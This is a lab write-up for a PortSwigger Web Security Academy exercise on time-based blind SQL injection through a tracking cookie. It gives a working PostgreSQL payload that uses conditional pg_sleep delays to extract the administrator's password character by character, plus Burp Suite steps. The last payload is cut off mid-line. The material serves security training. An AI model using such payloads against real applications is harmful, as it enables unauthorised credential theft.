# SQL Injection: Blind SQLi with Time Delays and Data Extraction

**Category:** SQL Injection
**Difficulty:** Practitioner
**Lab Link:** https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

---

## Vulnerability

The application is vulnerable to **time-based blind SQL injection** via a tracking cookie.
There is no visible output or errors, but response delays can be used to extract data.

---

## Payload

```id="v8p3zn"
' || (SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

---

## Exploitation Steps

1. Intercept the request using Burp Suite.

2. Locate the tracking cookie (`TrackingId`).

3. Inject conditional delay payload:

```id="x2m7kl"
TrackingId=xyz' || (SELECT CASE WHEN (condition) THEN pg_sleep(5_
```
